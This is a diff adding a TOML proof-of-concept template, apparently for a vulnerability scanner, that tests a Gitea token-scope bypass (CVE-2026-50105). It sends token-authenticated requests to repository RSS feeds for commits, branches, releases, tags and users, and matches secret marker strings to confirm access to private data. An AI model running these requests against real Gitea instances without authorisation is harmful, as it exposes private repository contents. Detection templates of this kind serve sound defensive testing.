@@ -1,0 +1,109 @@
+[info]
+author = "ave"
+description = "验证 Gitea RSS/Atom feed 处理器绕过 API token 作用域和 public-only 限制，导致受限 token 仍可访问私有仓库的提交/发布/标签数据"
+id = "POC-AVE-2026-0336"
+name = "Gitea RSS/Atom Feed Token Confinement Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0336"]
+vuln_id = [
+    "CVE-2026-50105",
+    "AVE-2026-0336",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}/{{Repo}}.rss"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SECRET-COMMIT-MARKER"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}/{{Repo}}/rss/branch/main"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SECRET-COMMIT-MARKER"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}/{{Repo}}/releases.rss"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SECRET-RELEASE-MARKER"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}/{{Repo}}/tags.rss"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SECRET-TAG-MARKER"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{Owner}}.rss"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{Base64Token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SECRET-COMMIT-MARKER"]
